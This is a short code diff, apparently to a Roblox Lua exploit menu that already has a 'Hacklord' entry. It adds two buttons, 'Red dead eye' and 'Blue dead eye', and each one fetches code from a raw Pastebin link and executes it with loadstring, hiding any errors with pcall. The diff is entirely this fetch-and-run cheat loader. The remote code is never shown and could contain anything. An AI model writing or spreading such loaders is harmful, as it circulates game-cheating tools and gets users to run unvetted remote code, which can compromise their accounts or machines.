@@ -789,6 +789,18 @@ CreateButton(MainPage, "Hacklord", function()
     end)
 end)
 
+CreateButton(MainPage, "Red dead eye", function()
+    pcall(function()
+        loadstring(game:HttpGet("https://pastebin.com/raw/377urnW7"))()
+    end)
+end)
+
+CreateButton(MainPage, "Blue dead eye", function()
+    pcall(function()
+        loadstring(game:HttpGet("https://pastebin.com/raw/Pu0qVEhM"))()
+    end)
+end)
+
 local dragref = nil
 local offset  = Vector2.new(0, 0)
 
